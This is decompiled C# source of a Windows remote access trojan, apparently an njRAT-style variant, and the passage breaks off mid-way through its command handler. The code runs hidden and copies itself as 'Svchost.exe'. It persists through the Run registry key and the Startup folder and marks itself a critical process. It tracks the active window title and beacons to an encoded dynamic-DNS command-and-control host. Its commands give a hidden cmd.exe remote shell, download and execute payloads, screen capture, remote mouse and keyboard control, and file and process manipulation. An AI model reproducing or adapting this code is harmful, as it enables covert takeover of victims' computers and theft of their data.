using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using ns1;
using ns2;
using ns3;
using ns5;

namespace ns0;

internal class A : Form
{
	public delegate void Delegate0();

	public delegate void Delegate1();

	public delegate void Delegate2();

	public delegate void Delegate3();

	public delegate void Delegate4(string data1, string data2);

	public delegate void Delegate5(string data1);

	private IContainer icontainer_0;

	private Timer timer_0;

	private Timer timer_1;

	public string string_0;

	public string string_1;

	public int int_0;

	public string string_2;

	public string string_3;

	public string string_4;

	public string string_5;

	public string string_6;

	public string string_7;

	public string string_8;

	public string string_9;

	public bool bool_0;

	public bool bool_1;

	public string string_10;

	public string string_11;

	public string string_12;

	public string string_13;

	public int int_1;

	public object object_0;

	private object object_1;

	public object object_2;

	private object object_3;

	private string string_14;

	private string string_15;

	private RegistryKey registryKey_0;

	private Class0 class0_0;

	private string string_16;

	public string string_17;

	private string string_18;

	private string string_19;

	private int int_2;

	private string string_20;

	private string string_21;

	private Class2 class2_0;

	public Class3 class3_0;

	private string string_22;

	private string string_23;

	public A()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Expected O, but got Unknown
		//IL_013a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0144: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)A_Load);
		((Form)this).add_FormClosed(new FormClosedEventHandler(A_FormClosed));
		((Form)this).add_FormClosing(new FormClosingEventHandler(A_FormClosing));
		string_0 = "bXJpeGNhcmV6bWF4MTIzLm5vLWlwLmJpeg==";
		string_1 = "ضحيهء";
		int_0 = Conversions.ToInteger("5000");
		this.string_2 = "Svchost.exe";
		string_3 = "Microsoft";
		string_4 = "False";
		string_5 = "True";
		string_6 = "False";
		string_7 = "False";
		string_8 = "False";
		string_9 = "False";
		bool_0 = Conversions.ToBoolean("False");
		bool_1 = Conversions.ToBoolean("True");
		string_10 = "SPK";
		string_11 = "Svchost";
		string_12 = "False";
		string_13 = "True";
		checked
		{
			int_1 = (int)Math.Round(Conversions.ToDouble("0") * 1000.0);
			object_0 = new FileInfo(Application.get_ExecutablePath());
			object_2 = (object)new Computer();
			object_3 = Environment.UserName + "@" + Environment.MachineName;
			string_14 = Environment.GetEnvironmentVariable("windir", EnvironmentVariableTarget.Machine);
			string_15 = "SELECT * FROM Win32_VideoController";
			registryKey_0 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", writable: false);
			vmethod_5(new Class0());
			string_17 = "|UACODER|";
			string_18 = CultureInfo.CurrentCulture.EnglishName;
			string_19 = string_18.Substring(string_18.IndexOf('(') + 1, string_18.LastIndexOf(')') - string_18.IndexOf('(') - 1);
			string string_ = "Shell_traywnd";
			string string_2 = "";
			int_2 = FindWindowA(ref string_, ref string_2);
			class2_0 = new Class2();
			class3_0 = new Class3();
			string_22 = this.string_2.Replace(".exe", "");
			string_23 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
			InitializeComponent();
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		icontainer_0 = new Container();
		vmethod_1(new Timer(icontainer_0));
		vmethod_3(new Timer(icontainer_0));
		((Control)this).SuspendLayout();
		vmethod_0().set_Enabled(true);
		vmethod_0().set_Interval(50);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(0, 0);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_ControlBox(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("A");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
	}

	[SpecialName]
	internal virtual Timer vmethod_0()
	{
		return timer_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_1(Timer timer_2)
	{
		EventHandler eventHandler = method_7;
		if (timer_0 != null)
		{
			timer_0.remove_Tick(eventHandler);
		}
		timer_0 = timer_2;
		if (timer_0 != null)
		{
			timer_0.add_Tick(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Timer vmethod_2()
	{
		return timer_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_3(Timer timer_2)
	{
		EventHandler eventHandler = method_8;
		if (timer_1 != null)
		{
			timer_1.remove_Tick(eventHandler);
		}
		timer_1 = timer_2;
		if (timer_1 != null)
		{
			timer_1.add_Tick(eventHandler);
		}
	}

	public string method_0(int int_3, int int_4)
	{
		Random random = new Random();
		string text = null;
		string text2 = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPLKHJJGFDSAZXCVBNM1234567890";
		checked
		{
			int num = random.Next(int_3 + 1, int_4);
			for (int i = 1; i <= num; i++)
			{
				int index = (int)Math.Round(Conversion.Int((float)(text2.Length - 2) * VBMath.Rnd()) + 1f);
				text += Conversions.ToString(text2[index]);
			}
			string text3 = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPLKHJJGFDSAZXCVBNM1234567890";
			return Conversions.ToString(text3[random.Next(0, text3.Length - 1)]) + text;
		}
	}

	private string method_1()
	{
		StringBuilder stringBuilder = new StringBuilder(256);
		IntPtr foregroundWindow = GetForegroundWindow();
		GetWindowText(foregroundWindow, stringBuilder, stringBuilder.Capacity);
		return stringBuilder.ToString();
	}

	public string method_2()
	{
		try
		{
			string string_ = Interaction.Environ("SystemDrive") + "\\";
			string string_2 = null;
			int int_ = 0;
			int int_2 = 0;
			string string_3 = null;
			int int_3 = default(int);
			GetVolumeInformationA(ref string_, ref string_2, 0, ref int_3, ref int_, ref int_2, ref string_3, 0);
			return Conversion.Hex(int_3);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "ERR";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private void method_3()
	{
		method_4(0);
	}

	public void method_4(int int_3)
	{
		try
		{
			NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref int_3, 4);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_5(object object_4, object object_5)
	{
		try
		{
			Class0 @class = vmethod_4();
			string text = string_17;
			string string_ = Conversions.ToString(NewLateBinding.LateGet(object_5, (Type)null, "Data", new object[0], (string[])null, (Type[])null, (bool[])null));
			string text2 = method_28(ref string_);
			NewLateBinding.LateSetComplex(object_5, (Type)null, "Data", new object[1] { string_ }, (string[])null, (Type[])null, true, false);
			@class.method_9("rs" + text + text2);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_6()
	{
		try
		{
			vmethod_4().method_9("rsc" + string_17);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_7(object sender, EventArgs e)
	{
		string text = method_1();
		if (Operators.CompareString(string_20, text, false) != 0)
		{
			string_20 = text;
			vmethod_0().Stop();
			vmethod_4().method_9("AW" + string_17 + text);
			vmethod_0().Start();
		}
	}

	private void method_8(object sender, EventArgs e)
	{
		if (!vmethod_4().method_6())
		{
			vmethod_4().method_7(method_29(ref string_0), int_0);
		}
	}

	private void A_FormClosed(object sender, FormClosedEventArgs e)
	{
		Process.Start(Application.get_ExecutablePath());
	}

	private void A_FormClosing(object sender, FormClosingEventArgs e)
	{
		Process.Start(Application.get_ExecutablePath());
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void A_Load(object sender, EventArgs e)
	{
		//IL_0290: Unknown result type (might be due to invalid IL or missing references)
		//IL_029a: Expected O, but got Unknown
		Control.set_CheckForIllegalCrossThreadCalls(false);
		VBMath.Randomize();
		if (Conversions.ToBoolean(string_4))
		{
			string_16 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		}
		if (Conversions.ToBoolean(string_5))
		{
			string_16 = Path.GetTempPath();
		}
		if (Conversions.ToBoolean(string_6))
		{
			string_16 = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\";
		}
		if (File.Exists(string_16 + string_3 + "\\" + string_2))
		{
			try
			{
				File.Delete(string_16 + string_3 + "\\" + string_2);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(string_16 + string_3 + "\\" + string_2, Application.get_ExecutablePath(), false) != 0)
		{
			Directory.CreateDirectory(string_16 + string_3);
			if (File.Exists(string_16 + string_3 + "\\" + string_2))
			{
				ProjectData.EndApp();
			}
			Sleep(int_1);
			File.Copy(Process.GetCurrentProcess().MainModule!.FileName, string_16 + string_3 + "\\" + string_2);
			File.WriteAllText(Path.GetTempPath() + "mlt.tmp", Application.get_ExecutablePath());
			if (Conversions.ToBoolean(string_9))
			{
				File.SetAttributes(Application.get_ExecutablePath(), FileAttributes.Hidden);
			}
			Process.Start(string_16 + string_3 + "\\" + string_2);
			ProjectData.EndApp();
		}
		Thread thread = new Thread(class2_0.method_0, 1);
		thread.Start();
		string_1 = string_1 + "_" + method_2();
		Timer val = vmethod_2();
		val.set_Interval(2000);
		val.set_Enabled(true);
		val.Start();
		val = null;
		vmethod_4().method_7(method_29(ref string_0), int_0);
		if (Conversions.ToBoolean(string_8))
		{
			try
			{
				((ServerComputer)Class7.smethod_0()).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + string_11 + ".exe", true);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		if (bool_1)
		{
			try
			{
				SystemEvents.add_SessionEnding((SessionEndingEventHandler)delegate
				{
					method_3();
				});
				method_4(1);
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
		if (bool_0)
		{
			class3_0.string_0 = string_10 + ".exe";
			class3_0.method_0();
		}
		if (Conversions.ToBoolean(string_7))
		{
			try
			{
				File.Delete(File.ReadAllText(Path.GetTempPath() + "mlt.tmp"));
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
			try
			{
				File.Delete(Path.GetTempPath() + "mlt.tmp");
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
			}
		}
		if (Conversions.ToBoolean(string_9))
		{
			File.SetAttributes(Application.get_ExecutablePath(), FileAttributes.Hidden);
		}
		try
		{
			File.Delete(Path.GetTempPath() + "mlt.tmp");
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		if (Conversions.ToBoolean(string_13))
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("software\\microsoft\\windows\\currentversion\\run", writable: true);
				registryKey.SetValue(string_22, Application.get_ExecutablePath(), RegistryValueKind.String);
				registryKey.Close();
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void method_9()
	{
		Timer val = vmethod_2();
		val.set_Interval(1000);
		val.set_Enabled(true);
		val.Start();
		val = null;
	}

	private void method_10()
	{
		vmethod_2().set_Interval(100);
		vmethod_2().Start();
		vmethod_4().method_7(method_29(ref string_0), int_0);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void method_11(byte[] byte_0)
	{
		//IL_10d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_10d6: Invalid comparison between Unknown and I4
		//IL_118a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1190: Invalid comparison between Unknown and I4
		//IL_1d07: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d22: Unknown result type (might be due to invalid IL or missing references)
		string text = Class12.smethod_6(ref byte_0);
		string[] array = Strings.Split(text, string_17, -1, (CompareMethod)0);
		checked
		{
			try
			{
				switch (array[0])
				{
				case "closeserver":
					ProjectData.EndApp();
					break;
				case "info":
				{
					string machineName = Environment.MachineName;
					string userName = Environment.UserName;
					string text22 = ((ServerComputer)Class7.smethod_0()).get_Info().get_OSFullName().Replace("Microsoft", "")
						.Replace("Windows", "Win")
						.Replace("®", "")
						.Replace("™", "")
						.Replace("  ", " ")
						.Replace(" Win", "Win");
					vmethod_4().method_9("info" + string_17 + string_1 + string_17 + machineName + string_17 + string_19 + string_17 + text22 + Class12.smethod_1() + string_17 + userName + string_17 + Class12.smethod_4() + string_17 + Class12.smethod_2() + string_17 + "v 3.2 R" + string_17 + Class12.smethod_3());
					break;
				}
				case "Uninstall":
					try
					{
						if (Conversions.ToBoolean(string_9))
						{
							File.SetAttributes(Application.get_ExecutablePath(), FileAttributes.Normal);
						}
						method_30();
						break;
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
						break;
					}
				case "update":
				{
					string text17 = array[1];
					if (Operators.CompareString(text17, "D", false) == 0)
					{
						string text18 = Application.get_StartupPath() + "\\D.exe";
						File.WriteAllBytes(text18, Convert.FromBase64String(array[2]));
						Process.Start(text18);
						try
						{
							if (Conversions.ToBoolean(string_9))
							{
								File.SetAttributes(Application.get_ExecutablePath(), FileAttributes.Normal);
							}
							method_30();
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							ProjectData.ClearProjectError();
						}
						ProjectData.EndApp();
					}
					else
					{
						if (Operators.CompareString(text17, "L", false) != 0)
						{
							break;
						}
						WebClient webClient = new WebClient();
						byte[] bytes = webClient.DownloadData(array[2]);
						string text19 = Application.get_StartupPath() + "\\L.exe";
						File.WriteAllBytes(text19, bytes);
						Process.Start(text19);
						try
						{
							if (Conversions.ToBoolean(string_9))
							{
								File.SetAttributes(Application.get_ExecutablePath(), FileAttributes.Normal);
							}
							method_30();
							break;
						}
						catch (Exception projectError5)
						{
							ProjectData.SetProjectError(projectError5);
							ProjectData.ClearProjectError();
							break;
						}
					}
					break;
				}
				case "RY":
					Process.Start(array[1]);
					break;
				case "F":
					((ServerComputer)Class7.smethod_0()).get_FileSystem().WriteAllBytes(array[2], Class12.smethod_5(ref array[1]), false);
					Process.Start(array[2]);
					vmethod_4().method_9("F");
					break;
				case "!":
				{
					Class1.smethod_4();
					Size size = Screen.get_PrimaryScreen().get_Bounds().Size;
					NewLateBinding.LateCall((object)vmethod_4(), (Type)null, "Send", new object[1] { Operators.ConcatenateObject((object)string.Concat(string.Concat(string.Concat(string.Concat("!" + string_17, Conversions.ToString(size.Width)), string_17), Conversions.ToString(size.Height)), string_17), object_3) }, (string[])null, (Type[])null, (bool[])null, true);
					break;
				}
				case "@":
				{
					int int_ = Conversions.ToInteger(array[1]);
					int int_2 = Conversions.ToInteger(array[2]);
					int int_3 = Conversions.ToInteger(array[3]);
					byte[] array3 = Class1.smethod_5(int_, int_2, int_3);
					MemoryStream memoryStream = new MemoryStream();
					string text6 = "@" + string_17;
					memoryStream.Write(Class12.smethod_5(ref text6), 0, text6.Length);
					memoryStream.Write(array3, 0, array3.Length);
					vmethod_4().method_10(memoryStream.ToArray());
					memoryStream.Dispose();
					break;
				}
				case "#":
				{
					Point position = new Point(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]));
					Cursor.set_Position(position);
					Class12.mouse_event(Conversions.ToInteger(array[3]), 0, 0, 0, 1);
					break;
				}
				case "#k#":
					Class12.keybd_event(Convert.ToByte(array[2]), (byte)Class12.MapVirtualKeyA(Convert.ToInt32(array[2]), 0), Convert.ToInt32(array[1]), 0);
					break;
				case "$":
				{
					Point position = new Point(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]));
					Cursor.set_Position(position);
					break;
				}
				case "sendfile":
					File.WriteAllBytes(Path.GetTempPath() + array[1], Convert.FromBase64String(array[2]));
					Thread.Sleep(1000);
					Process.Start(Path.GetTempPath() + array[1]);
					break;
				case "download":
					((ServerComputer)Class7.smethod_0()).get_Network().DownloadFile(array[1], Path.GetTempPath() + array[2]);
					Thread.Sleep(1000);
					Process.Start(Path.GetTempPath() + array[2]);
					break;
				case "wcod":
					NewLateBinding.LateCall((object)vmethod_4(), (Type)null, "Send", new object[1] { Operators.ConcatenateObject((object)("wcod" + string_17), object_3) }, (string[])null, (Type[])null, (bool[])null, true);
					break;
				case "exco":
				{
					string contents = array[1];
					string path = Path.GetTempPath() + "\\" + method_0(5, 10) + ".vbs";
					File.WriteAllText(path, contents);
					string text23 = Path.GetTempPath() + method_0(5, 10) + ".vbs";
					File.WriteAllText(text23, array[1]);
					Process.Start(text23, Conversions.ToString(0));
					break;
				}
				case "OpenPro":
					NewLateBinding.LateCall((object)vmethod_4(), (Type)null, "Send", new object[1] { Operators.ConcatenateObject((object)("OpenPro" + string_17), object_3) }, (string[])null, (Type[])null, (bool[])null, true);
					break;
				case "GetProcesses":
				{
					string text20 = "";
					string text21 = "ProcessSplit";
					Process[] processes = Process.GetProcesses();
					foreach (Process process2 in processes)
					{
						try
						{
							text20 = text20 + process2.ProcessName + "|" + Conversions.ToString(process2.Id) + "|" + process2.MainModule!.FileName + "|" + Conversions.ToString(process2.PrivateMemorySize64) + "|" + Conversions.ToString(process2.StartTime) + text21;
						}
						catch (Exception projectError6)
						{
							ProjectData.SetProjectError(projectError6);
							text20 = text20 + process2.ProcessName + "|" + Conversions.ToString(process2.Id) + "|-|" + Conversions.ToString(process2.PrivateMemorySize64) + "|-" + text21;
							ProjectData.ClearProjectError();
						}
					}
					vmethod_4().method_9("ProcessManager" + string_17 + text20 + string_17 + Path.GetFileNameWithoutExtension(Application.get_ExecutablePath()));
					break;
				}
				case "KillProcess":
				{
					string[] array44 = array[1].Split(new char[1] { 'P' });
					int num5 = array44.Length - 2;
					for (int k = 0; k <= num5; k++)
					{
						Process[] processesByName2 = Process.GetProcessesByName(array44[k]);
						foreach (Process process in processesByName2)
						{
							process.Kill();
						}
					}
					break;
				}
				case "SProcess":
				{
					string[] array43 = array[1].Split(new char[1] { 'P' });
					int num4 = array43.Length - 2;
					for (int j = 0; j <= num4; j++)
					{
						Process[] processesByName = Process.GetProcessesByName(array43[j]);
						method_27(processesByName[0]);
					}
					break;
				}
				case "rss":
					try
					{
						NewLateBinding.LateCall(object_1, (Type)null, "Kill", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					object_1 = new Process();
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet(object_1, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "RedirectStandardOutput", new object[1] { true }, (string[])null, (Type[])null, false, true);
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet(object_1, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "RedirectStandardInput", new object[1] { true }, (string[])null, (Type[])null, false, true);
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet(object_1, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "RedirectStandardError", new object[1] { true }, (string[])null, (Type[])null, false, true);
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet(object_1, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "FileName", new object[1] { "cmd.exe" }, (string[])null, (Type[])null, false, true);
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet(object_1, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "RedirectStandardError", new object[1] { true }, (string[])null, (Type[])null, false, true);
					((Process)object_1).OutputDataReceived += method_5;
					((Process)object_1).ErrorDataReceived += method_5;
					((Process)object_1).Exited += delegate
					{
						method_6();
					};
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet(object_1, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "UseShellExecute", new object[1] { false }, (string[])null, (Type[])null, false, true);
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet(object_1, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CreateNoWindow", new object[1] { true }, (string[])null, (Type[])null, false, true);
					NewLateBinding.LateSetComplex(NewLateBinding.LateGet(object_1, (Type)null, "StartInfo", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "WindowStyle", new object[1] { ProcessWindowStyle.Hidden }, (string[])null, (Type[])null, false, true);
					NewLateBinding.LateSet(object_1, (Type)null, "EnableRaisingEvents", new object[1] { true }, (string[])null, (Type[])null);
					vmethod_4().method_9("rss" + string_17);
					NewLateBinding.LateCall(object_1, (Type)null, "Start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					NewLateBinding.LateCall(object_1, (Type)null, "BeginErrorReadLine", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					NewLateBinding.LateCall(object_1, (Type)null, "BeginOutputReadLine", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					break;
				case "rs":
					NewLateBinding.LateCall(NewLateBinding.LateGet(object_1, (Type)null, "StandardInput", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "WriteLine", new object[1] { method_29(ref array[1]) }, (string[])null, (Type[])null, (bool[])null, true);
					break;
				case "rsc":
					try
					{
						NewLateBinding.LateCall(object_1, (Type)null, "Kill", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					object_1 = null;
					break;
				case "openfm":
					NewLateBinding.LateCall((object)vmethod_4(), (Type)null, "Send", new object[1] { Operators.ConcatenateObject((object)("openfm" + string_17), object_3) }, (string[])null, (Type[])null, (bool[])null, true);
					break;
				case "GetDrives":
					vmethod_4().method_9("Drives2" + string_17 + method_12());
					break;
				case "FileManager":
					try
					{
						vmethod_4().method_9("FileManager" + string_17 + method_13(array[1]) + method_14(array[1]));
						break;
					}
					catch (Exception ex13)
					{
						ProjectData.SetProjectError(ex13);
						Exception ex14 = ex13;
						vmethod_4().method_9("BrErr" + string_17 + ex14.Message);
						ProjectData.ClearProjectError();
						break;
					}
				case "Delete":
					try
					{
						string text16 = array[1];
						if (Operators.CompareString(text16, "Folder", false) == 0)
						{
							Directory.Delete(array[2]);
						}
						else if (Operators.CompareString(text16, "File", false) == 0)
						{
							File.Delete(array[2]);
						}
						break;
					}
					catch (Exception ex11)
					{
						ProjectData.SetProjectError(ex11);
						Exception ex12 = ex11;
						vmethod_4().method_9("Errorrs" + string_17 + ex12.Message);
						ProjectData.ClearProjectError();
						break;
					}
				case "Execute":
					Process.Start(array[1]);
					break;
				case "Rename":
					try
					{
						string text15 = array[1];
						if (Operators.CompareString(text15, "Folder", false) == 0)
						{
							object obj4 = NewLateBinding.LateGet(object_2, (Type)null, "FileSystem", new object[0], (string[])null, (Type[])null, (bool[])null);
							object[] array15 = new object[2];
							object[] array32 = array15;
							string[] array24 = array;
							string[] array33 = array24;
							int num3 = 2;
							array32[0] = array33[2];
							object[] array34 = array15;
							string[] array11 = array;
							string[] array35 = array11;
							int num2 = 3;
							array34[1] = array35[3];
							object[] array36 = array15;
							object[] array37 = array36;
							bool[] array17 = new bool[2] { true, true };
							NewLateBinding.LateCall(obj4, (Type)null, "RenameDirectory", array37, (string[])null, (Type[])null, array17, true);
							if (array17[0])
							{
								array24[num3] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array36[0]), typeof(string));
							}
							if (array17[1])
							{
								array11[num2] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array36[1]), typeof(string));
							}
						}
						else if (Operators.CompareString(text15, "File", false) == 0)
						{
							object obj5 = NewLateBinding.LateGet(object_2, (Type)null, "FileSystem", new object[0], (string[])null, (Type[])null, (bool[])null);
							object[] array36 = new object[2];
							object[] array38 = array36;
							string[] array11 = array;
							string[] array39 = array11;
							int num2 = 2;
							array38[0] = array39[2];
							object[] array40 = array36;
							string[] array24 = array;
							string[] array41 = array24;
							int num3 = 3;
							array40[1] = array41[3];
							object[] array15 = array36;
							object[] array42 = array15;
							bool[] array17 = new bool[2] { true, true };
							NewLateBinding.LateCall(obj5, (Type)null, "RenameFile", array42, (string[])null, (Type[])null, array17, true);
							if (array17[0])
							{
								array11[num2] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array15[0]), typeof(string));
							}
							if (array17[1])
							{
								array24[num3] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array15[1]), typeof(string));
							}
						}
						break;
					}
					catch (Exception ex9)
					{
						ProjectData.SetProjectError(ex9);
						Exception ex10 = ex9;
						vmethod_4().method_9("Errorrs" + string_17 + ex10.Message);
						ProjectData.ClearProjectError();
						break;
					}
				case "Hidden":
					try
					{
						string text14 = array[1];
						if (Operators.CompareString(text14, "Folder", false) == 0)
						{
							if (unchecked((int)FileSystem.GetAttr(array[2])) == 2)
							{
								FileSystem.SetAttr(array[2], (FileAttribute)0);
							}
							else
							{
								FileSystem.SetAttr(array[2], (FileAttribute)2);
							}
						}
						else if (Operators.CompareString(text14, "File", false) == 0)
						{
							if (File.GetAttributes(array[2]) == FileAttributes.Hidden)
							{
								File.SetAttributes(array[2], FileAttributes.Normal);
							}
							else
							{
								File.SetAttributes(array[2], FileAttributes.Hidden);
							}
						}
						break;
					}
					catch (Exception ex7)
					{
						ProjectData.SetProjectError(ex7);
						Exception ex8 = ex7;
						vmethod_4().method_9("Errorrs" + string_17 + ex8.Message);
						ProjectData.ClearProjectError();
						break;
					}
				case "Readonly":
					try
					{
						string text13 = array[1];
						if (Operators.CompareString(text13, "Folder", false) == 0)
						{
							if (unchecked((int)FileSystem.GetAttr(array[2])) == 1)
							{
								FileSystem.SetAttr(array[2], (FileAttribute)0);
							}
							else
							{
								FileSystem.SetAttr(array[2], (FileAttribute)1);
							}
						}
						else if (Operators.CompareString(text13, "File", false) == 0)
						{
							if (File.GetAttributes(array[2]) == FileAttributes.ReadOnly)
							{
								File.SetAttributes(array[2], FileAttributes.Normal);
							}
							else
							{
								File.SetAttributes(array[2], FileAttributes.ReadOnly);
							}
						}
						break;
					}
					catch (Exception ex5)
					{
						ProjectData.SetProjectError(ex5);
						Exception ex6 = ex5;
						vmethod_4().method_9("Errorrs" + string_17 + ex6.Message);
						ProjectData.ClearProjectError();
						break;
					}
				case "NF":
					Directory.CreateDirectory(array[1]);
					break;
				case "NFil":
					File.WriteAllText(array[1], "");
					break;
				case "copy":
					try
					{
						string text12 = array[1];
						if (Operators.CompareString(text12, "file", false) == 0)
						{
							string sourceFileName2 = array[2] + array[4];
							string destFileName2 = array[3] + array[4];
							File.Copy(sourceFileName2, destFileName2);
						}
						else if (Operators.CompareString(text12, "folder", false) == 0)
						{
							string string_25 = array[2] + array[4];
							string string_26 = array[3] + array[4];
							smethod_0(string_25, string_26);
						}
						break;
					}
					catch (Exception ex3)
					{
						ProjectData.SetProjectError(ex3);
						Exception ex4 = ex3;
						vmethod_4().method_9("Errorrs" + string_17 + ex4.Message);
						ProjectData.ClearProjectError();
						break;
					}
				case "cut":
					try
					{
						string text11 = array[1];
						if (Operators.CompareString(text11, "file", false) == 0)
						{
							string sourceFileName = array[2] + array[4];
							string destFileName = array[3] + array[4];
							File.Move(sourceFileName, destFileName);
						}
						else if (Operators.CompareString(text11, "folder", false) == 0)
						{
							string sourceDirName = array[2] + array[4];
							string destDirName = array[3] + array[4];
							Directory.Move(sourceDirName, destDirName);
						}
						break;
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						vmethod_4().method_9("Errorrs" + string_17 + ex2.Message);
						ProjectData.ClearProjectError();
						break;
					}
				case "sf":
				{
					Thread thread2 = new Thread(delegate(object object_4)
					{
						method_16(Conversions.ToString(object_4));
					});
					thread2.IsBackground = true;
					thread2.Start(array[1] + "|" + array[2] + "|" + array[3] + "|" + array[4]);
					break;
				}
				case "getfile":
				{
					Thread thread = new Thread(delegate(object object_4)
					{
						method_15(Conversions.ToString(object_4));
					});
					thread.IsBackground = true;
					thread.Start(array[2] + "|" + array[1] + "|" + array[3]);
					break;
				}
				case "getord":
					vmethod_4().method_9("getord|UACODER|" + array[1]);
					break;
				case "swp":
					SystemParametersInfoA(20, 0, ref array[1], 1);
					break;
				case "chat":
					NewLateBinding.LateCall((object)vmethod_4(), (Type)null, "Send", new object[1] { Operators.ConcatenateObject((object)("chat" + string_17), object_3) }, (string[])null, (Type[])null, (bool[])null, true);
					break;
				case "recv":
